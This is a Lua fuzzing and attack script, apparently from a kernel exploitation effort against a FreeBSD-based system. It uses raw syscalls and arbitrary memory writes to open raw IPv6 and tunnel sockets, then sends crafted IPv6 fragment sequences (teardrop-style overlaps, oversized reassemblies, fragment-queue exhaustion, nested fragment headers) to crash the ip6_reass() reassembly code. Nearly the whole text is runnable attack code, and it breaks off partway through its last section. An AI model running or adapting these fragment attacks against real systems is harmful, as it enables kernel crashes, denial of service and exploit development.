-- CRASH_CLASS: HIGH
-- PROBE 49b: IPv6 Fragment Reassembly State Attacks
--
-- Context: Probe 48c confirmed single-packet IPv6 extension header parsing
-- is solid (83 variants, zero crashes). But 48c's fragment tests were
-- single-shot malformed headers — they never created REAL reassembly state.
--
-- Attack: Send properly paired IPv6 fragments that force the kernel into
-- ip6_reass() reassembly context, then attack the reassembly state machine:
--   - Overlapping fragments (RFC 5722 violations, teardrop-style)
--   - Tiny fragments below minimum (8-byte payload boundary)
--   - Fragment queue resource exhaustion (many incomplete reassemblies)
--   - Huge reassembled total (fragments summing past 65535 bytes)
--   - Atomic fragments (fragment header but no actual fragmentation)
--   - Out-of-order delivery (last fragment first)
--   - Duplicate fragments (same offset, conflicting data)
--   - Fragment ID reuse after timeout
--
-- FreeBSD CVE history: fragment overlap handling, reassembly queue crashes,
-- mbuf chain corruption in ip6_reass(), teardrop variants.
--
-- Key difference from 48c: these attacks create LIVE reassembly contexts
-- in the kernel's fragment queue, then corrupt/abuse them.
--
-- A crash/reboot = kernel IPv6 reassembly bug found.

print("=== PROBE 49b: IPv6 FRAGMENT REASSEMBLY STATE ATTACKS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_sendto = make_syscall(133)

local AF_INET = 2
local AF_INET6 = 28
local SOCK_RAW = 3
local IPPROTO_RAW = 255
local IPPROTO_FRAGMENT = 44
local IPPROTO_UDP = 17
local IPPROTO_ICMPV6 = 58
local IPV6_HDRINCL = 36

local sent = 0
local errors = 0
local frag_id_counter = 0x49B00001

local function next_frag_id()
    frag_id_counter = frag_id_counter + 1
    return frag_id_counter
end

-- ============================================
-- SECTION A: Socket setup (same as 48c)
-- ============================================
print("--- SECTION A: Socket setup ---")

local raw6 = nil
do
    local ret = sc_socket(uint64(AF_INET6), uint64(SOCK_RAW), uint64(IPPROTO_RAW))
    local fd = to_num(ret)
    if fd > 0 then
        raw6 = fd
        print("  raw IPv6 socket: fd=" .. fd)
    else
        print("  raw IPv6 failed: " .. fd)
    end
end

if raw6 then
    local ret = sc_setsockopt(uint64(raw6), uint64(41), uint64(IPV6_HDRINCL),
        uint64(0), uint64(0))
    print("  IPV6_HDRINCL: " .. to_num(ret))
end

local raw4_fd = nil
do
    local ret = sc_socket(uint64(AF_INET), uint64(SOCK_RAW), uint64(41))
    local fd = to_num(ret)
    if fd > 0 then
        raw4_fd = fd
        print("  raw IPv4 (proto 41): fd=" .. fd)
        local one = memory.alloc(4)
        safe_wd(one, 1)
        sc_setsockopt(uint64(raw4_fd), uint64(0), uint64(2), uint64(one), uint64(4))
    else
        print("  raw IPv4 proto 41 failed: " .. fd)
    end
end

if not raw6 and not raw4_fd then
    print("=== PROBE 49b FAILED: no raw socket ===")
    return
end

-- sockaddr structures
local function make_sockaddr_in6(addr_bytes)
    local sa = memory.alloc(32)
    safe_wb(sa, 28)
    safe_wb(sa + 1, AF_INET6)
    safe_ww(sa + 2, 0)
    safe_wd(sa + 4, 0)
    for i = 0, 15 do
        safe_wb(sa + 8 + i, (addr_bytes[i + 1] or 0))
    end
    safe_wd(sa + 24, 0)
    return sa
end

local function make_sockaddr_in4(a, b, c, d)
    local sa = memory.alloc(16)
    safe_wb(sa, 16)
    safe_wb(sa + 1, 2)
    safe_ww(sa + 2, 0)
    safe_wb(sa + 4, a); safe_wb(sa + 5, b)
    safe_wb(sa + 6, c); safe_wb(sa + 7, d)
    return sa
end

local lo6 = make_sockaddr_in6({0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,1})
local lo4 = make_sockaddr_in4(127, 0, 0, 1)

print("")

-- ============================================
-- Helper: Build and send IPv6 fragment packet
-- ============================================
-- IPv6 header (40 bytes) + Fragment header (8 bytes) + payload
--
-- Fragment header layout:
--   Byte 0: Next Header (what the original unfragmented packet's upper layer is)
--   Byte 1: Reserved (0)
--   Bytes 2-3: Fragment Offset (13 bits) | Res (2 bits) | MF (1 bit)
--              Offset is in 8-byte units. Stored big-endian.
--              Bits: [offset:13][res:2][MF:1]
--   Bytes 4-7: Identification (32-bit, unique per fragment group)

local function build_ipv6_header(buf, off, payload_len, next_hdr, src_bytes, dst_bytes)
    safe_wb(buf + off, 0x60)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 0)
    safe_wb(buf + off + 4, math.floor(payload_len / 256))
    safe_wb(buf + off + 5, payload_len % 256)
    safe_wb(buf + off + 6, next_hdr)
    safe_wb(buf + off + 7, 64)
    for i = 0, 15 do
        safe_wb(buf + off + 8 + i, (src_bytes and src_bytes[i+1]) or 0)
        safe_wb(buf + off + 24 + i, (dst_bytes and dst_bytes[i+1]) or 0)
    end
    if not src_bytes then safe_wb(buf + off + 23, 1) end
    if not dst_bytes then safe_wb(buf + off + 39, 1) end
end

local function build_frag_header(buf, off, next_hdr, frag_offset_bytes, more_frags, frag_id)
    safe_wb(buf + off, next_hdr)
    safe_wb(buf + off + 1, 0)
    -- frag_offset is in 8-byte units, occupies upper 13 bits of 16-bit field
    -- Layout: [offset_13bits][reserved_2bits][MF_1bit]
    local offset_units = math.floor(frag_offset_bytes / 8)
    local field = offset_units * 8 + (more_frags and 1 or 0)
    safe_wb(buf + off + 2, math.floor(field / 256))
    safe_wb(buf + off + 3, field % 256)
    -- Fragment ID (4 bytes, big-endian)
    safe_wb(buf + off + 4, math.floor(frag_id / 16777216) % 256)
    safe_wb(buf + off + 5, math.floor(frag_id / 65536) % 256)
    safe_wb(buf + off + 6, math.floor(frag_id / 256) % 256)
    safe_wb(buf + off + 7, frag_id % 256)
end

local function fill_payload(buf, off, len, pattern)
    for i = 0, len - 1 do
        safe_wb(buf + off + i, (pattern + i) % 256)
    end
end

-- Send a complete IPv6 packet via available socket
local function send_pkt(buf, total_len, desc)
    local ok, ret_val
    if raw6 then
        ok, ret_val = pcall(function()
            return sc_sendto(uint64(raw6), uint64(buf), uint64(total_len),
                uint64(0), uint64(lo6), uint64(28))
        end)
        if ok then
            local rv = to_num(ret_val)
            if rv >= 0 then
                sent = sent + 1
                return true
            end
        end
    end
    -- Fallback: IPv6-in-IPv4 tunnel
    if raw4_fd then
        local ipv4_total = 20 + total_len
        local pkt4 = memory.alloc(ipv4_total + 4)
        safe_wb(pkt4, 0x45)
        safe_wb(pkt4 + 1, 0)
        safe_wb(pkt4 + 2, math.floor(ipv4_total / 256))
        safe_wb(pkt4 + 3, ipv4_total % 256)
        safe_ww(pkt4 + 4, 0x4900)
        safe_ww(pkt4 + 6, 0)
        safe_wb(pkt4 + 8, 64)
        safe_wb(pkt4 + 9, 41)
        safe_ww(pkt4 + 10, 0)
        safe_wb(pkt4 + 12, 127); safe_wb(pkt4 + 13, 0)
        safe_wb(pkt4 + 14, 0);   safe_wb(pkt4 + 15, 1)
        safe_wb(pkt4 + 16, 127); safe_wb(pkt4 + 17, 0)
        safe_wb(pkt4 + 18, 0);   safe_wb(pkt4 + 19, 1)
        for i = 0, total_len - 1 do
            local b = safe_rd(buf + i)
            if b then safe_wb(pkt4 + 20 + i, b % 256) end
        end
        ok, ret_val = pcall(function()
            return sc_sendto(uint64(raw4_fd), uint64(pkt4), uint64(ipv4_total),
                uint64(0), uint64(lo4), uint64(16))
        end)
        if ok then
            local rv = to_num(ret_val)
            if rv >= 0 then
                sent = sent + 1
                return true
            end
        end
    end
    errors = errors + 1
    print("  [ERR] " .. desc)
    return false
end

-- Helper: send a single IPv6 fragment
-- frag_offset_bytes must be multiple of 8 (except for attack cases)
local function send_fragment(frag_id, frag_offset_bytes, more_frags, payload_len, payload_pattern, desc, src_bytes, dst_bytes)
    local frag_hdr_len = 8
    local ipv6_payload = frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    build_ipv6_header(buf, 0, ipv6_payload, IPPROTO_FRAGMENT, src_bytes, dst_bytes)
    build_frag_header(buf, 40, IPPROTO_UDP, frag_offset_bytes, more_frags, frag_id)
    fill_payload(buf, 48, payload_len, payload_pattern or 0xAA)

    return send_pkt(buf, total, desc)
end

print("--- SECTION B: Normal fragment reassembly (baseline) ---")
print("")

-- B1: Simple 2-fragment reassembly (proves reassembly path works)
-- Fragment 1: offset=0, MF=1, 64 bytes payload (UDP header + data)
-- Fragment 2: offset=64, MF=0, 32 bytes payload (remaining data)
do
    local id = next_frag_id()
    local ok1 = send_fragment(id, 0, true, 64, 0x11, "B1a first frag off=0 MF=1 64B")
    local ok2 = send_fragment(id, 64, false, 32, 0x22, "B1b last frag off=64 MF=0 32B")
    print("  B1: 2-fragment reassembly: " .. (ok1 and ok2 and "sent" or "err"))
end

-- B2: 3-fragment reassembly
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0x33, "B2a off=0")
    send_fragment(id, 64, true, 64, 0x44, "B2b off=64")
    send_fragment(id, 128, false, 32, 0x55, "B2c off=128 last")
    print("  B2: 3-fragment reassembly: sent")
end

-- B3: Out-of-order delivery (last fragment first)
do
    local id = next_frag_id()
    send_fragment(id, 64, false, 32, 0x66, "B3a LAST first off=64")
    send_fragment(id, 0, true, 64, 0x77, "B3b FIRST second off=0")
    print("  B3: out-of-order (last-first): sent")
end

-- B4: Reverse order 3-fragment
do
    local id = next_frag_id()
    send_fragment(id, 128, false, 32, 0x88, "B4a off=128 last")
    send_fragment(id, 64, true, 64, 0x99, "B4b off=64 mid")
    send_fragment(id, 0, true, 64, 0xAA, "B4c off=0 first")
    print("  B4: reverse-order 3-frag: sent")
end

print("")
print("--- SECTION C: Overlapping fragment attacks ---")
print("")

-- C1: Exact duplicate fragment (same offset, same data)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xC1, "C1a off=0 MF=1")
    send_fragment(id, 0, true, 64, 0xC1, "C1b DUPLICATE off=0 MF=1")
    send_fragment(id, 64, false, 32, 0xC2, "C1c off=64 last")
    print("  C1: exact duplicate fragment: sent")
end

-- C2: Overlapping with different data (teardrop-style)
-- Frag1: offset=0, 64 bytes. Frag2: offset=32, 64 bytes (overlaps 32-63)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xD1, "C2a off=0 64B")
    send_fragment(id, 32, true, 64, 0xD2, "C2b off=32 64B OVERLAP")
    send_fragment(id, 96, false, 32, 0xD3, "C2c off=96 last")
    print("  C2: overlapping different data (teardrop): sent")
end

-- C3: Fragment fully contained within another
-- Frag1: offset=0, 128 bytes. Frag2: offset=32, 32 bytes (inside frag1)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 128, 0xE1, "C3a off=0 128B")
    send_fragment(id, 32, true, 32, 0xE2, "C3b off=32 32B INSIDE")
    send_fragment(id, 128, false, 32, 0xE3, "C3c off=128 last")
    print("  C3: contained fragment: sent")
end

-- C4: Overlapping LAST fragment (extends past original end)
-- Frag1: offset=0, 64B. Frag2: offset=32, 64B (last, MF=0). Original end at 64,
-- now last says end at 96. But we also have data from 0-63 from frag1.
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xF1, "C4a off=0 64B")
    send_fragment(id, 32, false, 64, 0xF2, "C4b off=32 64B LAST-OVERLAP")
    print("  C4: overlapping last fragment: sent")
end

-- C5: Two different 'last' fragments (conflicting total length)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xA1, "C5a off=0 MF=1")
    send_fragment(id, 64, false, 32, 0xA2, "C5b off=64 LAST-1 (total=96)")
    send_fragment(id, 64, false, 128, 0xA3, "C5c off=64 LAST-2 (total=192)")
    print("  C5: conflicting last fragments: sent")
end

-- C6: Overlapping at byte 0 with different sizes
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 32, 0xB1, "C6a off=0 32B")
    send_fragment(id, 0, true, 64, 0xB2, "C6b off=0 64B BIGGER-OVERLAP")
    send_fragment(id, 64, false, 32, 0xB3, "C6c off=64 last")
    print("  C6: zero-offset overlap different sizes: sent")
end

print("")
print("--- SECTION D: Tiny and minimum-size fragments ---")
print("")

-- D1: Minimum legal fragment (8 bytes payload — one fragment unit)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 8, 0xD1, "D1a off=0 8B min-legal MF=1")
    send_fragment(id, 8, false, 8, 0xD2, "D1b off=8 8B last")
    print("  D1: minimum-size fragments (8B each): sent")
end

-- D2: Sub-minimum fragment (less than 8 bytes, non-last with MF=1)
-- RFC says non-last fragments must be multiple of 8 bytes
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 4, 0xD3, "D2a off=0 4B SUB-MINIMUM MF=1")
    send_fragment(id, 4, false, 8, 0xD4, "D2b off=4 8B last")
    print("  D2: sub-minimum first fragment (4B): sent")
end

-- D3: Zero-length payload fragment
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 0, 0, "D3a off=0 0B EMPTY MF=1")
    send_fragment(id, 0, false, 32, 0xD5, "D3b off=0 32B last")
    print("  D3: zero-length first fragment: sent")
end

-- D4: Single-byte fragments (many of them)
do
    local id = next_frag_id()
    for i = 0, 7 do
        send_fragment(id, i * 8, (i < 7), 8, 0xD6 + i, "D4 off=" .. (i*8))
    end
    print("  D4: 8 minimum-size (8B) fragments: sent")
end

-- D5: Non-aligned fragment offset (not multiple of 8)
-- This should be rejected per RFC, but bugs happen
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xD7, "D5a off=0 64B")
    -- Fragment offset field must be multiple of 8, but we write raw bytes
    -- To create non-aligned offset, we need to craft the fragment header manually
    local frag_hdr_len = 8
    local payload_len = 32
    local ipv6_payload = frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)
    build_ipv6_header(buf, 0, ipv6_payload, IPPROTO_FRAGMENT, nil, nil)
    -- Manually set fragment offset to 5 (non-aligned, not multiple of 8)
    -- The offset field is in 8-byte units, but we want byte offset 5
    -- Offset field: upper 13 bits of bytes 2-3 in frag header
    -- For a raw byte offset of 40 (5 units): normal
    -- For byte offset 33 (4.125 units): we'd write 4 units + some bits
    -- Actually the field stores units, so non-aligned byte offset isn't possible
    -- in the standard encoding. But we can set offset=1 unit (8 bytes) with MF=0
    -- when the first fragment was 64 bytes — leaving a gap from 8-63.
    -- Let's create a gap instead:
    build_frag_header(buf, 40, IPPROTO_UDP, 128, false, id)  -- off=128, last
    fill_payload(buf, 48, payload_len, 0xD8)
    send_pkt(buf, total, "D5b off=128 last (gap 64-127)")
    print("  D5: fragment with gap (0-63, then 128+): sent")
end

print("")
print("--- SECTION E: Fragment queue exhaustion ---")
print("")

-- E1: Many incomplete reassemblies (first fragment only, never completed)
-- Each unique (src, dst, id) creates a new reassembly queue entry
-- Kernel should timeout these after ip6_fragttl (usually 60s)
do
    local exhaust_count = 50
    for i = 1, exhaust_count do
        local id = next_frag_id()
        send_fragment(id, 0, true, 64, i % 256, "E1 incomplete #" .. i)
    end
    print("  E1: " .. exhaust_count .. " incomplete reassemblies (first-frag-only): sent")
end

-- E2: Many fragments for same ID (fragment bomb)
-- Send 100 fragments all with MF=1 for the same ID
do
    local id = next_frag_id()
    for i = 0, 99 do
        send_fragment(id, i * 64, true, 64, i % 256, "E2 frag #" .. i)
    end
    -- Now send the last fragment to trigger reassembly of 100*64 + 32 = 6432 bytes
    send_fragment(id, 100 * 64, false, 32, 0xFF, "E2 last frag")
    print("  E2: 101-fragment reassembly (6432B total): sent")
end

-- E3: Rapid ID reuse — complete one reassembly, then reuse same ID
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xE3, "E3a first pass off=0")
    send_fragment(id, 64, false, 32, 0xE4, "E3b first pass last")
    -- Reuse same ID immediately
    send_fragment(id, 0, true, 128, 0xE5, "E3c REUSE off=0")
    send_fragment(id, 128, false, 32, 0xE6, "E3d REUSE last")
    print("  E3: fragment ID reuse after completion: sent")
end

print("")
print("--- SECTION F: Huge reassembled packet ---")
print("")

-- F1: Fragments totaling exactly 65535 bytes (maximum IPv6 payload)
-- Last fragment at offset 65504 (8176 units * 8), 31 bytes payload
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xF1, "F1a off=0 64B")
    -- Send last fragment at high offset — total = 65504 + 31 = 65535
    send_fragment(id, 65504, false, 31, 0xF2, "F1b off=65504 31B last (total=65535)")
    print("  F1: max-size reassembly (65535B total): sent")
end

-- F2: Fragments exceeding 65535 bytes (should be rejected)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xF3, "F2a off=0 64B")
    -- offset 65528 + 64 bytes = 65592 > 65535
    send_fragment(id, 65528, false, 64, 0xF4, "F2b off=65528 64B last (total=65592 OVER)")
    print("  F2: over-max reassembly (65592B): sent")
end

-- F3: Last fragment offset = maximum possible (65528) with large payload
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 8, 0xF5, "F3a off=0 8B")
    send_fragment(id, 65528, false, 256, 0xF6, "F3b off=65528 256B (total=65784 WAY OVER)")
    print("  F3: way-over-max reassembly (65784B): sent")
end

print("")
print("--- SECTION G: Atomic fragments and edge cases ---")
print("")

-- G1: Atomic fragment (fragment header present, offset=0, MF=0)
-- This is a "fragment" that isn't really fragmented. Some stacks mishandle it.
do
    local id = next_frag_id()
    send_fragment(id, 0, false, 64, 0x71, "G1 atomic frag off=0 MF=0")
    print("  G1: atomic fragment: sent")
end

-- G2: Atomic fragment with ID that matches a pending reassembly
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0xA1, "G2a off=0 MF=1 (start reassembly)")
    -- Now send atomic fragment with same ID — does it complete the reassembly?
    send_fragment(id, 0, false, 128, 0xA2, "G2b ATOMIC same ID (off=0 MF=0)")
    print("  G2: atomic fragment interrupting reassembly: sent")
end

-- G3: Fragment with offset=0, MF=0, but fragment ID already in use from G2-style
do
    local id = next_frag_id()
    -- Start partial reassembly
    send_fragment(id, 64, true, 64, 0xB1, "G3a off=64 MF=1 (middle frag first)")
    -- Send atomic frag
    send_fragment(id, 0, false, 32, 0xB2, "G3b ATOMIC off=0 MF=0")
    print("  G3: atomic frag with pending middle fragment: sent")
end

-- G4: Fragment ID = 0
do
    send_fragment(0, 0, true, 64, 0xC1, "G4a ID=0 off=0 MF=1")
    send_fragment(0, 64, false, 32, 0xC2, "G4b ID=0 off=64 last")
    print("  G4: fragment ID=0: sent")
end

-- G5: Fragment ID = 0xFFFFFFFF
do
    send_fragment(0xFFFFFFFF, 0, true, 64, 0xD1, "G5a ID=MAX off=0 MF=1")
    send_fragment(0xFFFFFFFF, 64, false, 32, 0xD2, "G5b ID=MAX off=64 last")
    print("  G5: fragment ID=0xFFFFFFFF: sent")
end

-- G6: Multiple reassemblies completing simultaneously (3 different IDs)
do
    local id1 = next_frag_id()
    local id2 = next_frag_id()
    local id3 = next_frag_id()
    -- Send all first fragments
    send_fragment(id1, 0, true, 64, 0xE1, "G6a id1 off=0")
    send_fragment(id2, 0, true, 64, 0xE2, "G6b id2 off=0")
    send_fragment(id3, 0, true, 64, 0xE3, "G6c id3 off=0")
    -- Complete all three rapidly
    send_fragment(id1, 64, false, 32, 0xE4, "G6d id1 last")
    send_fragment(id2, 64, false, 32, 0xE5, "G6e id2 last")
    send_fragment(id3, 64, false, 32, 0xE6, "G6f id3 last")
    print("  G6: 3 simultaneous reassemblies: sent")
end

print("")
print("--- SECTION H: Fragment offset boundary attacks ---")
print("")

-- H1: Fragments with gaps (offset 0-63, then 256+, nothing in between)
-- Kernel must handle the gap in reassembly queue
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 64, 0x81, "H1a off=0 64B")
    send_fragment(id, 256, false, 32, 0x82, "H1b off=256 last (gap 64-255)")
    print("  H1: fragments with 192B gap: sent")
end

-- H2: Many gaps (swiss cheese pattern)
do
    local id = next_frag_id()
    send_fragment(id, 0, true, 8, 0x01, "H2 off=0")
    send_fragment(id, 64, true, 8, 0x02, "H2 off=64")
    send_fragment(id, 128, true, 8, 0x03, "H2 off=128")
    send_fragment(id, 256, true, 8, 0x04, "H2 off=256")
    send_fragment(id, 512, true, 8, 0x05, "H2 off=512")
    send_fragment(id, 1024, false, 8, 0x06, "H2 off=1024 last")
    print("  H2: swiss-cheese fragments (5 gaps): sent")
end

-- H3: Fill the gaps from H2-style (partial completion)
do
    local id = next_frag_id()
    -- Create swiss cheese
    send_fragment(id, 0, true, 8, 0x10, "H3 off=0")
    send_fragment(id, 64, true, 8, 0x20, "H3 off=64")
    send_fragment(id, 128, false, 8, 0x30, "H3 off=128 last")
    -- Now try to fill gap 8-63
    send_fragment(id, 8, true, 56, 0x40, "H3 fill gap 8-63")
    -- Fill gap 72-127
    send_fragment(id, 72, true, 56, 0x50, "H3 fill gap 72-127")
    print("  H3: gap-filling fragments: sent")
end

-- H4: Fragment at offset 0 that's very large (covers multiple later frags)
do
    local id = next_frag_id()
    -- Send small fragments first
    send_fragment(id, 64, true, 8, 0x60, "H4a off=64 8B")
    send_fragment(id, 128, true, 8, 0x70, "H4b off=128 8B")
    send_fragment(id, 192, false, 8, 0x80, "H4c off=192 8B last")
    -- Now send first fragment that covers everything
    send_fragment(id, 0, true, 200, 0x90, "H4d off=0 200B COVERS ALL")
    print("  H4: late large first fragment covering all: sent")
end

print("")
print("--- SECTION I: Extension header + fragment combos ---")
print("")

-- I1: Hop-by-Hop options BEFORE fragment header, then fragment
-- IPv6 → HBH → Fragment → UDP payload
do
    local id = next_frag_id()
    local hbh_len = 8  -- minimum HBH extension header (8 bytes)
    local frag_hdr_len = 8
    local payload_len = 64

    -- First fragment: IPv6 + HBH(8) + FragHdr(8) + payload(64)
    local ipv6_payload = hbh_len + frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    -- IPv6 header: next = Hop-by-Hop (0)
    build_ipv6_header(buf, 0, ipv6_payload, 0, nil, nil)

    -- Hop-by-Hop header: next = Fragment (44), len = 0 (8 bytes total)
    safe_wb(buf + 40, IPPROTO_FRAGMENT)  -- next header
    safe_wb(buf + 41, 0)                  -- length (units of 8 bytes minus 1... actually (len+1)*8 = total)
    -- Pad with PadN option
    safe_wb(buf + 42, 1)  -- PadN type
    safe_wb(buf + 43, 4)  -- PadN length
    safe_wd(buf + 44, 0)  -- padding

    -- Fragment header at offset 48
    build_frag_header(buf, 48, IPPROTO_UDP, 0, true, id)

    -- Payload at offset 56
    fill_payload(buf, 56, payload_len, 0x91)

    send_pkt(buf, total, "I1a HBH+frag off=0 MF=1")

    -- Second fragment (no HBH — only the unfragmentable part repeats, but
    -- in practice we must include the HBH again since the kernel uses it)
    -- Actually in IPv6 fragmentation, the unfragmentable part (up to and
    -- including the fragment header) repeats. Extension headers BEFORE the
    -- fragment header are "unfragmentable" and repeat in every fragment.
    local total2 = 40 + hbh_len + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, hbh_len + frag_hdr_len + 32, 0, nil, nil)
    safe_wb(buf2 + 40, IPPROTO_FRAGMENT)
    safe_wb(buf2 + 41, 0)
    safe_wb(buf2 + 42, 1)
    safe_wb(buf2 + 43, 4)
    safe_wd(buf2 + 44, 0)
    build_frag_header(buf2, 48, IPPROTO_UDP, 64, false, id)
    fill_payload(buf2, 56, 32, 0x92)

    send_pkt(buf2, total2, "I1b HBH+frag off=64 last")
    print("  I1: HBH + fragmented UDP: sent")
end

-- I2: Routing header BEFORE fragment header
do
    local id = next_frag_id()
    local rh_len = 8  -- minimum routing header
    local frag_hdr_len = 8
    local payload_len = 64
    local ipv6_payload = rh_len + frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    -- IPv6: next = Routing (43)
    build_ipv6_header(buf, 0, ipv6_payload, 43, nil, nil)

    -- Routing header: next = Fragment, type=2, segleft=0
    safe_wb(buf + 40, IPPROTO_FRAGMENT)
    safe_wb(buf + 41, 0)   -- length
    safe_wb(buf + 42, 2)   -- routing type 2
    safe_wb(buf + 43, 0)   -- segments left
    safe_wd(buf + 44, 0)   -- reserved

    build_frag_header(buf, 48, IPPROTO_UDP, 0, true, id)
    fill_payload(buf, 56, payload_len, 0xA1)
    send_pkt(buf, total, "I2a RH+frag off=0")

    -- Second fragment
    local total2 = 40 + rh_len + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, rh_len + frag_hdr_len + 32, 43, nil, nil)
    safe_wb(buf2 + 40, IPPROTO_FRAGMENT)
    safe_wb(buf2 + 41, 0)
    safe_wb(buf2 + 42, 2)
    safe_wb(buf2 + 43, 0)
    safe_wd(buf2 + 44, 0)
    build_frag_header(buf2, 48, IPPROTO_UDP, 64, false, id)
    fill_payload(buf2, 56, 32, 0xA2)
    send_pkt(buf2, total2, "I2b RH+frag off=64 last")
    print("  I2: Routing header + fragmented UDP: sent")
end

-- I3: Destination options BEFORE fragment header
do
    local id = next_frag_id()
    local do_len = 8
    local frag_hdr_len = 8
    local payload_len = 64
    local ipv6_payload = do_len + frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    build_ipv6_header(buf, 0, ipv6_payload, 60, nil, nil)  -- next = Dest Options

    safe_wb(buf + 40, IPPROTO_FRAGMENT)
    safe_wb(buf + 41, 0)
    safe_wb(buf + 42, 1)  -- PadN
    safe_wb(buf + 43, 4)
    safe_wd(buf + 44, 0)

    build_frag_header(buf, 48, IPPROTO_UDP, 0, true, id)
    fill_payload(buf, 56, payload_len, 0xB1)
    send_pkt(buf, total, "I3a DstOpt+frag off=0")

    local total2 = 40 + do_len + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, do_len + frag_hdr_len + 32, 60, nil, nil)
    safe_wb(buf2 + 40, IPPROTO_FRAGMENT)
    safe_wb(buf2 + 41, 0)
    safe_wb(buf2 + 42, 1)
    safe_wb(buf2 + 43, 4)
    safe_wd(buf2 + 44, 0)
    build_frag_header(buf2, 48, IPPROTO_UDP, 64, false, id)
    fill_payload(buf2, 56, 32, 0xB2)
    send_pkt(buf2, total2, "I3b DstOpt+frag off=64 last")
    print("  I3: Dest Options + fragmented UDP: sent")
end

-- I4: Nested fragments — fragment header after fragment header
-- IPv6 → Fragment(outer) → Fragment(inner) → UDP
-- This is invalid per RFC but may confuse parsers
do
    local id_outer = next_frag_id()
    local id_inner = next_frag_id()
    local inner_frag_len = 8
    local payload_len = 64
    local ipv6_payload = 8 + 8 + payload_len  -- outer frag + inner frag + payload
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    build_ipv6_header(buf, 0, ipv6_payload, IPPROTO_FRAGMENT, nil, nil)
    -- Outer fragment: next = Fragment (nested!)
    build_frag_header(buf, 40, IPPROTO_FRAGMENT, 0, false, id_outer)
    -- Inner fragment: next = UDP
    build_frag_header(buf, 48, IPPROTO_UDP, 0, true, id_inner)
    fill_payload(buf, 56, payload_len, 0xC1)
    send_pkt(buf, total, "I4 nested fragment headers")
    print("  I4: nested fragment headers: sent")
end

print("")
print("--- SECTION J: Rapid-fire fragment interleaving ---")
print("")

-- J1: Interleaved fragments from multiple reassemblies
-- Fragments arrive: A0, B0, C0, A1, B1, C1 (3 IDs interleaved)
do
    local idA = next_frag_id()
    local idB = next_frag_id()
    local idC = next_frag_id()

    send_fragment(idA, 0, true, 64, 0x10, "J1 A off=0")
    send_fragment(idB, 0, true, 64, 0x20, "J1 B off=0")
    send_fragment(idC, 0, true, 64, 0x30, "J1 C off=0")
    send_fragment(idA, 64, false, 32, 0x11, "J1 A off=64 last")
    send_fragment(idB, 64, false, 32, 0x21, "J1 B off=64 last")
    send_fragment(idC, 64, false, 32, 0x22, "J1 C off=64 last")
    print("  J1: 3 interleaved reassemblies: sent")
end

-- J2: 10 interleaved reassemblies completing out of order
do
    local ids = {}
    for i = 1, 10 do ids[i] = next_frag_id() end

    -- Send all first fragments
    for i = 1, 10 do
        send_fragment(ids[i], 0, true, 64, i, "J2 first #" .. i)
    end
    -- Complete in reverse order
    for i = 10, 1, -1 do
        send_fragment(ids[i], 64, false, 32, i + 0x10, "J2 last #" .. i)
    end
    print("  J2: 10 interleaved, reverse-completion: sent")
end

-- J3: Same fragment ID from different "sources" via different IPv6 src addrs
-- We change the source address to see if the kernel keys on (src, dst, id)
do
    local id = next_frag_id()
    -- Source ::1 (normal loopback)
    local src1 = {0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,1}
    -- Source ::2 (different loopback addr)
    local src2 = {0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,2}
    local dst = {0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,1}

    send_fragment(id, 0, true, 64, 0xAA, "J3a src=::1 off=0", src1, dst)
    send_fragment(id, 0, true, 64, 0xBB, "J3b src=::2 off=0 SAME ID", src2, dst)
    -- Complete the ::1 reassembly
    send_fragment(id, 64, false, 32, 0xCC, "J3c src=::1 off=64 last", src1, dst)
    -- Complete the ::2 reassembly
    send_fragment(id, 64, false, 32, 0xDD, "J3d src=::2 off=64 last", src2, dst)
